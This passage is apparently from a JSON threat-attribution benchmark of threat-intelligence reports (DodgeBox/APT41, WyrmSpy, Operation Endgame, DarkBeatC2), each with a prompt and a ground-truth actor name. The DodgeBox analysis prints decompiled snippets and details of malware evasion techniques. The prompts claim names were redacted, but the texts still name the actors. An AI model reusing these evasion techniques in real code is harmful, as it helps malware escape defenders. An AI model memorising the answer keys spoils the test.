Sandboxie (SandboxieWUAU.exe), while the other was developed by AhnLab. All exports within the DLL point to a single function that primarily invokes the main function of the malware, as illustrated below:\nvoid SbieDll_Hook()\n{\n if ( dwExportCalled )\n {\n   Sleep(0xFFFFFFFF);\n }\n else\n {\n   hSbieDll_ = hSbieDll;\n   dwExportCalled = 1;\n   MalwareMain();\n }\n}\nMalwareMain implements the main functionality of DodgeBox, and can be broken down into three main phases:\n1. Decryption of DodgeBox’s configuration\nDodgeBox employs AES Cipher Feedback (AES-CFB) mode for encrypting its configuration. AES-CFB transforms AES from a block cipher into a stream cipher, allowing for the encryption of data with different lengths without requiring padding. The encrypted configuration is embedded within the .data section of the binary. To ensure the integrity of the configuration, DodgeBox utilizes hard-coded MD5 hashes to validate both the embedded AES keys and the encrypted configuration. For reference, a sample of DodgeBox's decrypted configuration can be found in the Appendix section of this blog. We will reference this sample configuration using the variable Config in the following sections.\n2. Execution guardrails and environment setup\nAfter decrypting its configuration, DodgeBox performs several environment checks to ensure it is running on its intended target.\nExecution guardrail: Argument check\nDodgeBox starts by verifying that the process was launched with the correct arguments. It scans the argv parameter for a specific string defined in Config.szArgFlag. Next, it calculates the MD5 hash of the subsequent argument and compares it to the hash specified in Config.rgbArgFlagValueMD5. In this case, DodgeBox expects the arguments to include --type driver. If this verification check fails, the process is terminated.\nEnvironment setup: API Resolution\nAfterwards, DodgeBox proceeds to resolve multiple APIs that are utilized for additional environment checks and setup. Notably, DodgeBox employs a salted FNV1a hash for DLL and function names. This salted hash mechanism aids DodgeBox in evading static detections that typically search for hashes of DLL or function names. Additionally, it enables different samples of DodgeBox to use distinct values for the same DLL and function, all while preserving the integrity of the core hashing algorithm.\nThe following code shows DodgeBox calling its ResolveImport function to resolve the address of LdrLoadDll, and populating its import table.\n// ResolveImport takes in (wszDllName, dwDllNameHash, dwFuncNameHash)\nsImportTable->ntdll_LdrLoadDll = ResolveImport(L\"ntdll\", 0xFE0B07B0, 0xCA7BB6AC);\nInside the ResolveImport function, DodgeBox utilizes the FNV1a hashing function in a two-step process. First, it hashes the input string, which represents a DLL or function name. Then, it hashes a salt value separately. This two-step hashing procedure is equivalent to hashing the concatenation of the input string and salt. The following pseudo-code represents the implementation of the salted hash:\ndwHash = 0x811C9DC5;     // Standard initial seed for FNV1a\npwszInputString_Char = pwszInputString;\ncchInputString = -1LL;\ndo\n ++cchInputString;\nwhile ( pwszInputString[cchInputString] );\npwszInputStringEnd = (pwszInputString + 2 * cchInputString);\nif ( pwszInputString < pwszInputStringEnd )\n{\n do  // Inlined FNV1a hash\n {\n   chChar = *pwszInputString_Char;\n   pwszInputString_Char = (pwszInputString_Char + 1);\n   dwHash = 0x1000193 * (dwHash ^ chChar);\n }\n while ( pwszInputString_Char < pwszInputStringEnd );\n}\nv17 = &g_HashSaltPostfix;    // Salt value: CB 24 B4 BA\ndo  // Inlined FNV1a hash, use previous hash as seed\n{\n v18 = *v17;\n v17 = (v17 + 1);\n dwHash = 0x1000193 * (dwHash ^ v18);\n}\nwhile ( v17 < g_HashSaltPostfix_End );\nA Python script to generate the salted hashes is included in the Appendix.\nIn addition to the salted hash implementation, DodgeBox incorporates another noteworthy feature in its ResolveImport function. This function accepts both the DLL name as a string and its hash value as arguments. This redundancy appears to be designed to provide flexibility, allowing DodgeBox to handle scenarios where the target DLL has not yet been loaded. In such cases, DodgeBox invokes the LoadLibraryW function with the provided string to load the DLL dynamically.\nFurthermore, DodgeBox effectively handles forwarded exports and exports by ordinals. It utilizes ntdll!LdrLoadDll and ntdll!LdrGetProcedureAddressEx when necessary to resolve the address of the exported function. This approach ensures that DodgeBox can successfully resolve and utilize the desired functions, regardless of the export method used.\nEnvironment setup: DLL unhooking\nOnce DodgeBox has resolved the necessary functions, it proceeds to scan and unhook DLLs that are loaded from the System32 directory. This process involves iterating through the .pdata section of each DLL, retrieving each function’s start and end addresses, and calculating an FNV1a hash for the bytes of each function. DodgeBox then computes a corresponding hash for the same function's bytes as stored on disk. If the two hashes differ, potential tampering can be detected, and DodgeBox will replace the in-memory function with the original version from the disk.\nFor each DLL that has been successfully scanned, DodgeBox marks the corresponding LDR_DATA_TABLE_ENTRY by clearing the ReservedFlags6 field and setting the upper bit to 1. This marking allows DodgeBox to avoid scanning the same DLL twice.\nEnvironment setup: Disabling CFG\nFollowing that, DodgeBox checks if the operating system is Windows 8 or newer. If so, the code verifies whether Control Flow Guard (CFG) is enabled by calling GetProcessMitigationPolicy with the ProcessControlFlowGuardPolicy parameter. If CFG is active, the malware attempts to disable it.\nTo achieve this, DodgeBox locates the LdrpHandleInvalidUserCallTarget function within ntdll.dll by searching for a specific byte sequence. Once found, the malware patches this function with a simple jmp rax instruction:\nntdll!LdrpHandleInvalidUserCallTarget:\n00007ffe`fc8cf070 48ffe0          jmp     rax\n00007ffe`fc8cf073 cc              int     3\n00007ffe`fc8cf074 90              nop\nCFG verifies the validity of indirect call targets. When a CFG check fails, LdrpHandleInvalidUserCallTarget is invoked, typically raising an interrupt. At this point, the rax register contains the invalid target address. The patch modifies this behavior, calling the target directly instead of raising an interrupt, thus bypassing CFG protection.\nIn addition, DodgeBox replaces msvcrt!_guard_check_icall_fptr with msvcrt!_DebugMallocator<int>::~_DebugMallocator<int>, a function that returns 0 to disable the CFG check performed by msvcrt.\nExecution guardrail: MAC, computer name, and user name checks\nFinally, DodgeBox performs a series of checks to verify if it is configured to run on the current machine. The malware compares the machine’s MAC address against Config.rgbTargetMac, and compares the computer name against Config.wszTargetComputerName. Depending on the Config.fDoCheckIsSystem flag, DodgeBox checks whether it is running with SYSTEM privileges. If any of these checks fail, the malware terminates execution.\n3. Payload decryption and environment keying\nPayload decryption\nIn the final phase, DodgeBox commences the decryption process for the MoonWalk payload DAT file. The code starts by inspecting the first four bytes of the file. If these bytes are non-zero, it signifies that the DAT file has been tied to a particular machine, (which is described below). However, if the DAT file is not machine-specific, DodgeBox proceeds to decrypt the file using AES-CFB encryption, utilizing the key parameters stored in the configuration file. In the samples analyzed by ThreatLabz, this decrypted DAT file corresponds to a DLL, which is the MoonWalk backdoor.\nEnvironment keying of the payload\nAfter the decryption process, DodgeBox takes the additional step of keying the payload to the current machine. It accomplishes this by re-encrypting the payload using the Config.rgbAESKeyForDatFile key. However, in this specific scenario, the process deviates from the configuration file's IV (Initialization Vector). Instead, it utilizes the MD5 hash of the current machine's GUID as the AES IV. This approach guarantees that the decrypted DAT file cannot be decrypted on any other machine, thus enhancing the payload's security.\nLoading the payload using DLL hollowing\nNext, DodgeBox reflectively loads the payload using a DLL hollowing technique. At a high level, the process begins with the random selection of a host DLL from the System32 directory, ensuring it is not on a blocklist (DLL blocklist available in the Appendix section) and has a sufficiently large .text section. A copy of this DLL is then created at C:\\Windows\\Microsoft.NET\u0007ssembly\\GAC_MSIL\\System.Data.Trace\u000b4.0_4.0.0.0__<random bytes from pcrt4!UuidCreate>\\<name of chosen DLL>.dll. DodgeBox modifies this copy by disabling the NX flag, removing the reloc and TLS sections, and patching its entry point with a simple return 1.\nFollowing the preparation of the host  DLL for injection, DodgeBox proceeds by zeroing the PE headers, and the IMAGE_DATA_DIRECTORY structures corresponding to the import, reloc, and debug directories of the payload DLL. This modified payload DLL is then inserted into the previously selected host DLL. The resulting copy of the modified host DLL is loaded into memory using the NtCreateSection and NtMapViewOfSection APIs.\nOnce the DLL is successfully loaded, DodgeBox updates the relevant entries in the Process Environment Block (PEB) to reflect the newly loaded DLL. To further conceal its activities, DodgeBox overwrites the modified copy of the host DLL with its original contents, making it appear as a legitimate, signed DLL on disk. Finally, the malware calls the entrypoint of the payload DLL.\nInterestingly, if the function responsible for DLL hollowing fails to load the payload DLL, DodgeBox employs a fallback mechanism. This fallback function implements a traditional form of reflective DLL loading using NtAllocateVirtualMemory and NtProtectVirtualMemory.\nAt this stage, the payload DLL has been successfully loaded, and control is transferred to the payload DLL by invoking the first exported function.\nCall stack spoofing\nThere is one last technique employed by DodgeBox throughout all three phases discussed above: call stack spoofing. Call stack spoofing is employed to obscure the origins of API calls, making it more challenging for EDRs and antivirus systems to detect malicious activity. By manipulating the call stack, DodgeBox makes API calls appear as if they originate from trusted binaries rather than the malware itself. This prevents security solutions from gaining contextual information about the true source of the API calls.\nDodgeBox specifically utilizes call stack spoofing when invoking Windows APIs that are more likely to be monitored. As an example, it directly calls RtlInitUnicodeString, a Windows API that only performs string manipulation, instead of using stack spoofing.\n(sImportTable->ntdll_RtlInitUnicodeString)(v25, v26);\nHowever, call stack spoofing is used when calling NtAllocateVirtualMemory, an API known to be abused by malware, as shown below:\nCallFunction(\n   sImportTable->ntdll_NtAllocateVirtualMemory,  // API to call\n   0,    // Unused\n   6LL,  // Number of parameters\n   // Parameters to the API\n   -1LL, &pAllocBase, 0LL, &dwSizeOfImage, 0x3000, PAGE_READWRITE)\nThe technique mentioned above can be observed in the figures below. In the first figure, we can see a typical call stack when explorer.exe invokes the CreateFileW function. The system monitoring tool, SysMon, effectively walks the call stack, enabling us to understand the purpose behind this API call and examine the modules and functions involved in the process.\n\nIn contrast, the next figure shows the call stack recorded by SysMon when DodgeBox uses stack spoofing to call the CreateFileW function. Notice that there is no indication of DodgeBox’s modules that triggered the API call. Instead, the modules involved all appear to be legitimate Windows modules.\n\nThere is an excellent writeup of this technique, so we will only highlight some implementation details specific to DodgeBox:\n•\tWhen the CallFunction is invoked, DodgeBox uses a random jmp qword ptr [rbp+48h] gadget residing within the .text section of KernelBase.\n•\tDodgeBox analyzes the unwind codes within the .pdata section to extract the unwind size for the function that includes the selected gadget.\n•\tDodgeBox obtains the addresses of RtlUserThreadStart + 0x21 and BaseThreadInitThunk + 0x14, along with their respective unwind sizes.\n•\tDodgeBox sets up the stack by inserting the addresses of RtlUserThreadStart + 0x21, BaseThreadInitThunk + 0x14, and the address of the gadget at the right positions, utilizing the unwind sizes retrieved.\n•\tFollowing that, DodgeBox proceeds to insert the appropriate return address at [rbp+48h] and prepares the registers and stack with the necessary argument values to be passed to the API. This preparation ensures that the API is called correctly and with the intended parameters.\n•\tFinally, DodgeBox executes a jmp instruction to redirect the control flow to the targeted API.\nThreat Attribution\nIn this section, we outline the different tactics, techniques, and procedures (TTPs) that were utilized as indicators during our threat attribution process. Through the identification of these overlapping TTPs, we attribute this activity to a China-based threat actor known as APT41. Our confidence level in this attribution is medium.\nAbuse of DLL sideloading\nDLL sideloading is a technique commonly utilized by APT groups with links to China. Typically, this method involves three essential components: a legitimate executable (EXE) file that is signed, a malicious DLL file, and an encrypted data file. While the specific combination of the EXE and DLL files mentioned here has not been publicly documented as being associated with APT41, the presence of these three components could indicate the involvement of a group linked to China.\nTargeted regions\nAnalysis of the telemetry available in VirusTotal reveals that DodgeBox samples have been submitted from both Thailand and Taiwan. This observation aligns with previous instances of APT41 employing StealthVector in campaigns primarily targeting users in the Southeast Asian (SEA) region.\nFurthermore, during the monitoring of the attacker-controlled Google Drive account utilized for C2 communication, a spreadsheet containing the personal details of individuals from India was discovered. This spreadsheet is publicly available from other sources, suggesting that the threat actor may have leveraged it to identify potential additional targets.\nSimilarities between DodgeBox and StealthVector\nDuring our analysis of DodgeBox, we noted a number of similarities with StealthVector. In this section, we compare the code between variants of StealthVector uploaded to VirusTotal in 2021 and 2024, along with DodgeBox.\nSimilarities in checksum and configuration decryption\nBoth StealthVector and DodgeBox perform an integrity check on their encrypted configurations. This verification process consists of two essential steps. First, the hard-coded size of the configuration is validated, ensuring it matches the expected size. Second, the hash of the configuration is verified to ensure its integrity. Once these checks are successfully completed, the malware proceeds with decrypting the configuration.\nStealthVector (2021)\nOld variants of StealthVector use a CRC32 hashing algorithm for integrity checks and ChaCha20 for decryption of the configuration.\nStealthVector (2024)\n\nNewer variants of StealthVector use a CRC32 hashing algorithm, and AES-CBC for decryption.\nDodgeBox\n\nDodgeBox uses an MD5 hashing algorithm for integrity checks, and AES-CFB for decryption of the configuration.\nSimilarities in decrypted configuration format\nThese similarities encompass various aspects such as guardrails, payload filenames, sizes and offsets, as well as cryptographic secrets. Both the original StealthVector and DodgeBox configurations also incorporate checksums for their encrypted payloads.\nStealthVector (2021)\n\nThe configuration extracted from the 2021 variant of StealthVector reveals several similarities with the 2024 variant of StealthVector and DodgeBox.\nStealthVector (2024)\n\nThe configuration extracted from the 2024 variant of StealthVector reveals several similarities with the 2021 variant of StealthVector and DodgeBox.\nDodgeBox\n\nFigure 9: Configuration extracted from DodgeBox.\nThe configuration extracted from DodgeBox reveals several similarities with the 2024 and 2021 variant of StealthVector.\nSimilarities in environment keying\nBoth StealthVector and DodgeBox perform environment keying by decrypting then re-encrypting the bundled payload.\nStealthVector (2021)\nTrendMicro’s report did not document StealthVector utilizing environment keying.\nStealthVector (2024)\n\nFigure 10: 2024 variant of StealthVector performing environment keying, using a rolling XOR against the computer name.\nThe updated version of StealthVector employs the first four bytes of the payload (rgbDecryptedData_In_Out) to check whether the payload has been keyed. If the payload has not been previously keyed, StealthVector proceeds to key it using the computer name of the target machine.\nThis keying process involves a rolling XOR operation to encode the payload, followed by re-encryption using AES. In the analyzed sample, StealthVector sets the first four bytes of the payload to 0x90909090, serving as an indicator that the payload has been successfully keyed.\nDodgeBox\n\nDodgeBox employs the first four bytes of the payload (pFileData) to determine whether it has been keyed. If the payload has not been previously keyed, DodgeBox decrypts the payload using the AES IV from its configuration. DodgeBox then proceeds to re-encrypt it using the MD5 hash of the target machine's MachineGUID as the new AES IV.\nIn the given sample, DodgeBox sets the first four bytes of the payload to 0x000000ED. This non-zero value serves as an indicator that the payload has indeed been keyed and should be decrypted with the new AES IV.\nSimilarities in disabling CFG\nAll three samples exhibit remarkably similar logic in their approach to patching CFG. This similarity extends to the use of identical byte patterns for locating the LdrpHandleInvalidUserCallTarget function, as well as applying the same patch in this function.\nStealthVector (2021)\n\nThe code extracted from the 2021 variant of StealthVector showcases the disabling of CFG with striking similarity to all three samples.\nStealthVector (2024)\n\nThe code extracted from the 2024 variant of StealthVector showcases the disabling of CFG with striking similarity to all three samples.\nDodgeBox\n\nThe code extracted from DodgeBox showcases the disabling of CFG with striking similarity to all three samples.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "APT41"
    },
    {
        "url": "https://www.lookout.com/threat-intelligence/article/wyrmspy-dragonegg-surveillanceware-apt41",
        "Text": "Lookout Attributes Advanced Android Surveillanceware to Chinese Espionage Group APT41\nSummary\n•\tLookout attributes WyrmSpy and DragonEgg to infamous Chinese espionage group APT41, which has not slowed down since recent indictments by the U.S. government.\n•\tAPT41 is known to target a wide range of public and private sector organizations, including nation-state governments, software development companies, computer hardware manufacturers, telecommunications providers, social media companies, and video game companies.\n•\tAn established threat actor like APT41 turning their focus to mobile devices shows that mobile endpoints are high-value targets with coveted data.\n•\tWyrmSpy and DragonEgg use modules to hide their malicious intentions and avoid detection.\n•\tWyrmSpy and DragonEgg were first reported to Lookout Threat Intelligence Services subscribers in October 2020 and January 2021 respectively in full write-ups that included IOCs, YARA rules, and additional threat analysis.\n•\tContact us if you have been targeted or would like to consult with our research team on mobile threats.\nWhat are WyrmSpy and DragonEgg surveillanceware?\nWyrmSpy and DragonEgg are two advanced Android surveillanceware that Lookout attributes to high-profile Chinese threat group APT41, also known as Double Dragon, BARIUM, and Winnti. \nWhile APT41 is mostly known for exploiting web-facing applications and infiltrating traditional endpoint devices, these malware are rare reported instances of the group exploiting mobile platforms.\nLookout Threat Lab researchers have been actively tracking both spyware and providing coverage to Lookout Mobile Endpoint Security customers. We provided the first detailed write-up of WyrmSpy to our Threat Intelligence Services subscribers in October 2020. The Lookout Security Graph first ingested samples of WyrmSpy in 2017, while DragonEgg was first detected in early 2021 and our latest example dates to April 2023.\nBoth surveillanceware appear to have sophisticated data collection and exfiltration capabilities and hide those functions in additional modules that are downloaded after they are installed. WyrmSpy primarily masquerades as a default operating system app, while DragonEgg pretends to be third-party keyboard or messaging apps.\n\nWhat is the APT41 espionage group?\nAPT41 is a state-sponsored APT espionage group based in the People’s Republic of China that has been active since 2012. Unlike many nation-state-backed APT groups, APT41 has a track record of compromising both government organizations for espionage, as well as different private enterprises for financial gain. \nAccording to U.S. grand jury indictments from 2019 and 2020, the group was involved in compromising over 100 public and private organizations, and individuals in the United States and around the world, including Australia, Japan, India, South Korea, Singapore, and Taiwan. These companies include software development companies, computer hardware manufacturers, telecommunications providers, social media companies, video game companies, universities, think tanks, and foreign governments, as well as pro-democracy politicians and activists in Hong Kong.\nThe U.S Department of Justice’s indictment named five individuals associated with APT41, three of whom — Jiang Lizhi (蒋立志), Qian Chuan (钱川), and Fu Qiang (付强) — are publicly listed in leadership positions of Chinese company Chengdu 404 Network Technology Co., Ltd., a.k.a “Chengdu 404.”\nThe indictment charges the men with conspiracy, racketeering, money laundering, fraud, identity theft, access device fraud, unauthorized access to protected computers and wire fraud in association with Chengdu 404.\n\nThe FBI notice poster with images of the individuals charged in connection to APT41’s cyber espionage activities. \n\n\nA Chinese business directory listing for Chengdu 404 lists Qian Chuan as “Managing Director” and Jiang Lizhi as “Manager.” Chengdu 404 is described as “a network technology company.”\n\nAPT41’s connection with WyrmSpy and DragonEgg\nDragonEgg and WyrmSpy are connected to each other through their use of overlapping Android signing certificates. Some versions of WyrmSpy introduced unique signing certificates that were later observed in use by DragonEgg developers.\nIt was through WyrmSpy that Lookout was able to attribute the two malware to APT41 due to a link between the command-and-control (C2) infrastructure hard-coded into the malware’s source code and Chengdu 404. Early samples use IP address “121.42.149[.]52” as part its C2 infrastructure, which was the resolving IP for a subdomain, “vpn2.umisen[.]com,” a part of the hacking infrastructure APT41 used between May 2014 until August 2020, as revealed in the U.S. Department of Justice’s indictment.\n\nWyrmSpy includes a hard-coded C2 IP address, “121.42.149[.]52”, used as a resolving IP for a known APT41 domain.\n\n\n“Vpn2.umisen[.]com” is a subdomain of umisen[.]com, which itself resolved only to 121.42.149[.]52 from the end of 2015 through late 2017. A total of 14 samples that Lookout researchers analyzed that communicated with this IP address, which appeared to have been packaged between March and July 2017.\n\nThe IP address found in earlier WyrmSpy samples was the resolving IP for “umisen[.]com” between December 2015 and August 2017, when malware samples containing this C2 were created and distributed.\n\n\nA WHOIS record for “umisen[.]com” from 2015 and 2016 lists one of the individuals named in the indictment, Jiang Lizhi, as the registrant for the domain. The email listed in the WHOIS record, “huliwahaha@gmail[.]com,” resembles a password ”wahaha@20170”, which is also mentioned in the indictment.\n\nThe IP address found in earlier WyrmSpy samples was the resolving IP for “umisen[.]com” between December 2015 and August 2017, when malware samples containing this C2 were created and distributed.\n\n\nHow are WyrmSpy and DragonEgg deployed\nIt appears that the targeting of WyrmSpy and DragonEgg varies greatly.\nWyrmSpy primarily masquerades as a default Android system app used for displaying notifications to the user. Later variants package the malware into apps masquerading as adult video content, “Baidu Waimai” food delivery platform, and Adobe Flash. \nDragonEgg has been observed in apps purporting to be third-party Android keyboards and messaging apps like Telegram.\nLookout researchers have not yet encountered samples in the wild and assess with moderate confidence that they are distributed to victims through social engineering campaigns. Google confirmed that based on current detection, no apps containing this malware are found to be on Google Play.\n\nNotable capabilities of WyrmSpy and DragonEgg\nThe two malware request extensive device permissions while relying on modules that are downloaded after the apps are installed to enable data-exfiltration capabilities. \nWyrmSpy capabilities\nAfter it’s installed and launched, WyrmSpy uses known rooting tools to gain escalated privileges to the device and perform surveillance activities specified by commands received from its C2 servers. These commands include instructing the malware to upload log files, photos stored on the device, and acquire device location using the Baidu Location library.\nAlthough we were not able to acquire additional modules from the C2 infrastructure at the time of discovery, we assess with high confidence that a secondary payload is used by the malware to perform additional surveillance functionality. This is based on the permissions that WyrmSpy obtains but does not use in the code contained in the app, which indicates abilities to exfiltrate additional data, such as SMS and audio recordings.\nConfiguration files used by the malware to execute instructions received by the C2 further support this hypothesis, with references to “AudioRecord” and “Files” set to true or false based on received commands.\nPotential data that WyrmSpy collects\n•\tLog files\n•\tPhotos\n•\tDevice location\n•\tSMS messages (read and write)\n•\tAudio recording\nDragonEgg capabilities\nSimilar to WyrmSpy, DragonEgg appears to rely on additional payloads to implement the full scale of its surveillance functionality. \nAt launch, the malware acquires — either from C2 infrastructure or a bundled file within the APK — a payload often named “smallmload.jar” which attempts to acquire and launch additional functionality. Like WyrmSpy, the DragonEgg samples request extensive permissions for services that are not directly exploited in the core app. \nWe suspect that by trojanizing legitimate chat apps like Telegram, APT41 is trying to remain inconspicuous while requesting access to extensive device data. Messaging apps typically request access to sensitive device data, and by hiding its surveillance functionality within a large, fully-functional app, the threat actor is better able to remain inconspicuous while the app is running on the device or statically analyzed by a researcher.\nPotential data that DragonEgg collects\n•\tDevice contacts\n•\tSMS messages\n•\tExternal device storage files\n•\tDevice location\n•\tAudio recording\n•\tCamera photos\nWyrmSpy Technical analysis\nCommunications with C2 and configuration files\nWyrmSpy relies on commands received from C2, as well as configuration files to determine the actions it takes against the compromised device and the data it exfiltrates. As server-side code is not accessible from the C2, it is not yet clear whether a threat actor has automated the commands sent to the malware client, or whether direct human interaction is required. \nThe configuration files are created and populated by WyrmSpy on startup and form the basis of the behavior on an infected device. As the malware interacts with the device and receives instructions from its C2, it modifies the configuration files accordingly.\nAdditional configuration files contain information about the C2, metadata and identifiers that were initially collected about the infected device. A file named “ManifestFile.json” is acquired from the C2 and specifies C2 beaconing intervals, lists of files for upload and download, and a list of shell commands to execute on the device.\n\nWyrmSpy relies on commands received from its C2, as well as configuration files to determine the actions it takes against the compromised device and the data it exfiltrates.\n\nRooting the device\nWyrmSpy leverages well known rooting tools such as KingRoot11 and IovyRoot/IvyRoot12. It’s also able to disable SELinux on appropriate versions of Android, an action attackers sometimes take in order to access data they might not otherwise be able to.\nIf the packaged rooting tool does not work or does not exist, and if the device is not already rooted, the malware queries the C2 infrastructure with the model and kernel version of the infected device. It then receives a response containing a file name which the malware uses to download additional rooting binaries from C2 infrastructure if one exists for the specified device.\n\nThe malware attempts to acquire an additional rooting tool to gain root privileges if the bundled tools, like KingRoot, are unsuccessful.\n\nDragonEgg technical analysis\nSimilar to WyrmSpy, DragonEgg relies on a secondary payload often named “smallmload.jar” to load a tertiary module.\n\nIn DragonEgg’s logging messages, the developers refer to the tertiary module acquired by the “smallmload” class files as “forensics program (T1 version)”. Naming surveillance tools as “forensics program” is common amongst Chinese-speaking defense or software development firms. This is in contrast to the use of “trojan” or other malware-related moniker that independent developers of surveillance tools would use.\nBy the time we analyzed DragonEgg, its C2 infrastructure was already offline, which prevented Lookout researchers from acquiring this “T1” forensics tool loaded by the core application.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "APT41"
    },
    {
        "url": "https://www.europol.europa.eu/media-press/newsroom/news/largest-ever-operation-against-botnets-hits-dropper-malware-ecosystem",
        "Text": "Largest ever operation against botnets hits dropper malware ecosystem\nInternational operation shut down droppers including IcedID, SystemBC, Pikabot, Smokeloader and Bumblebee leading to four arrests and takedown of over 100 servers worldwide\nBetween 27 and 29 May 2024 Operation Endgame, coordinated from Europol’s headquarters, targeted droppers including, IcedID, SystemBC, Pikabot, Smokeloader, Bumblebee and Trickbot. The actions focused on disrupting criminal services through arresting High Value Targets, taking down the criminal infrastructures and freezing illegal proceeds. This approach had a global impact on the dropper ecosystem. The malware, whose infrastructure was taken down during the action days, facilitated attacks with ransomware and other malicious software. Following the action days, eight fugitives linked to these criminal activities, wanted by Germany, will be added to Europe’s Most Wanted list on 30 May 2024. The individuals are wanted for their involvement in serious cybercrime activities.\nThis is the largest ever operation against botnets, which play a major role in the deployment of ransomware. The operation, initiated and led by France, Germany and the Netherlands was also supported by Eurojust and involved Denmark, the United Kingdom and the United States. In addition, Armenia, Bulgaria, Lithuania, Portugal, Romania, Switzerland and Ukraine also supported the operation with different actions, such as arrests, interviewing suspects, searches, and seizures or takedowns of servers and domains. The operation was also supported by a number of private partners at national and international level including Bitdefender, Cryptolaemus, Sekoia, Shadowserver, Team Cymru, Prodaft, Proofpoint, NFIR, Computest, Northwave, Fox-IT, HaveIBeenPwned, Spamhaus, DIVD, abuse.ch and Zscaler.\nThe coordinated actions led to:\n•\t4 arrests (1 in Armenia and 3 in Ukraine)\n•\t16 location searches (1 in Armenia, 1 in the Netherlands, 3 in Portugal and 11 in Ukraine)\n•\tOver 100 servers taken down or disrupted in Bulgaria, Canada, Germany, Lithuania, the Netherlands, Romania, Switzerland, the United Kingdom, the United States and Ukraine \n•\tOver 2 000 domains under the control of law enforcement\nFurthermore, it has been discovered through the investigations so far that one of the main suspects has earned at least EUR 69 million in cryptocurrency by renting out criminal infrastructure sites to deploy ransomware. The suspect’s transactions are constantly being monitored and legal permission to seize these assets upon future actions has already been obtained.\nWhat is a dropper and how does it work?\nMalware droppers are a type of malicious software designed to install other malware onto a target system. They are used during the first stage of a malware attack, during which they allow criminals to bypass security measures and deploy additional harmful programs, such as viruses, ransomware, or spyware. Droppers themselves do not usually cause direct damage but are crucial for accessing and implementing harmful softwares on the affected systems.\nSystemBC facilitated anonymous communication between an infected system and a command-and-control servers. Bumblebee, distributed mainly via phishing campaigns or compromised websites, was designed to enable the delivery and execution of further payloads on compromised systems. SmokeLoader was primarily used as a downloader to install additional malicious softwares onto the systems it infects. IcedID (also known as BokBot), initially categorised as a banking trojan, had been further developed to serve other cybercrimes in addition to the theft of financial data. Pikabot is a trojan  used to get initial access to infected computers which enables ransomware deployments, remote computer take-over and data theft. All of them are now being used to deploy ransomware and are seen as the main threat in the infection chain.\nDroppers’ operation phases\nInfiltration: Droppers can enter systems through various channels, such as email attachments, compromised websites, they can also be bundled with legitimate software.\nExecution: Once executed, the dropper installs the additional malware onto the victim's computer. This installation often occurs without the user's knowledge or consent.\nEvasion: Droppers are designed to avoid detection by security software. They may use methods like obfuscating their code, running in memory without saving to disk, or impersonating legitimate software processes.\nPayload Delivery: After deploying the additional malware, the dropper may either remain inactive or remove itself to evade detection, leaving the payload to carry out the intended malicious activities.\nEndgame doesn’t end here\nOperation Endgame does not end today. New actions will be announced on the website Operation Endgame. In addition, suspects involved in these and other botnets, who have not yet been arrested, will be directly called to account for their actions. Suspects and witnesses will find information on how to reach out via this website.\nCommand post at Europol to coordinate the operational actions\nEuropol facilitated the information exchange and provided analytical, crypto-tracing and forensic support to the investigation. To support the coordination of the operation, Europol organised more than 50 coordination calls with all the countries as well as an operational sprint at its headquarters.\nOver 20 law enforcement officers from Denmark, France, Germany and the United States supported the coordination of the operational actions from the command post at Europol and hundreds of other officers from the different countries involved in the actions. In addition, a virtual command post allowed real-time coordination between the Armenian, French, Portuguese and Ukrainian officers deployed on the spot during the field activities.\nThe command post at Europol facilitated the exchange of intelligence on seized servers, suspects and the transfer of seized data. Local command posts were also set up in Germany, the Netherlands, Portugal, the United States and Ukraine. Eurojust supported the action by setting up a coordination centre at its headquarters to facilitate the judicial cooperation between all authorities involved. Eurojust also assisted with the execution of European Arrest Warrants and European Investigation Orders.\nNational authorities at the core of Operation Endgame\nEU Member States:\n•\tDenmark: Danish Police (Politi)\n•\tFrance: National Gendarmerie (Gendarmerie Nationale) and National Police (Police Nationale); Public Prosecutor Office JUNALCO (National Jurisdiction against Organised Crime) Cybercrime Unit; Paris Judicial Police (Préfecture De Police de Paris)\n•\tGermany: Federal Criminal Police Office (Bundeskriminalamt), Prosecutor General's Office Frankfurt am Main – Cyber Crime Center\n•\tNetherlands: National Police (Politie), Public Prosecution Office (Openbaar Ministerie)\nNon-EU Member States:\n•\tThe United Kingdom: National Crime Agency\n•\tThe United States: Federal Bureau of Investigation, United States Secret Service, The Defense Criminal Investigative Service, United States Department of Justice\nAuthorities involved in local coordination centres for Operation Endgame:\n•\tPortugal: Judicial Police (Polícia Judiciária)\n•\tUkraine: Prosecutor General’s Office (Офіс Генерального прокурора); National Police (Національна поліція України); Security Service (Служба безпеки України)\nThe list of participating authorities was updated on 30 May 2024 at 12:10 CET.\nThe list of private partners was updated on 30 May 2024 at 17:00 CET.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "TA505"
    },
    {
        "url": "https://www.deepinstinct.com/blog/darkbeatc2-the-latest-muddywater-attack-framework",
        "Text": "DarkBeatC2: The Latest MuddyWater Attack Framework\nDuring the “Swords of Iron War” against Hamas terrorists, Iranian threat actors increased the intensity of their “hack and leak” fake hacktivist operations against Israeli companies in the private sector. This blog post highlights some of the recent attacks conducted and provides an analysis of “DarkBeatC2,” the latest C2 framework in MuddyWater’s arsenal.\nExecutive Summary\nIranian threat actors continue to collaborate and hand off compromised targets to conduct supply-chain attacks by leveraging information from previous breaches.\nDeep Instinct’s Threat Research team identified a previously unreported C2 framework that MuddyWater is suspected of using.\nIn this post, we shed additional light on recent state-sponsored attacks.\nBackground\nDespite the large number of Iranian cyber attacks against Israeli organizations, which has significantly increased since the start of the “Swords of Iron War,” Israeli reporting about the attacks has been limited to mainstream news reports without technical details beyond general IOCs.\nMost of the technical details about the attacks are exclusively being shared by international companies outside of Israel even though most of the incident response is done by local Israeli companies and the Israel National Cyber Directorate (INCD).\nFor example, in mid-February 